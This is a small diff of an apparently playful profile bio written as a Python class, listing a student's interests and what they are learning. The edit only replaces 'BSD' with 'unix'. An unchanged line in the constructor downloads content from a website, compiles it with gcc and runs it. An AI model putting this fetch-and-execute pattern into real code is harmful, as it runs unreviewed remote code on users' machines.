@@ -8,7 +8,7 @@ class melorin4:
   def __init__(self):
     subprocess.call("curl -sL 'melorin4.github.io' | gcc -w -o name -xc - && ./name", shell=True)
     self.bio = {
-      '- i'm interested in'           : {'art, *NIX customisation, linux and BSD in general >:)'}
+      '- i'm interested in'           : {'art, *NIX customisation, linux and unix in general >:)'}
       '- i am a'                      : {'18 year old software engineering student'},
       '- i’m currently learning'      : {'java, lua, web development, pico-8'},
       '- you can ask me about'            : {'linux', 'art', 'games', 'books'}
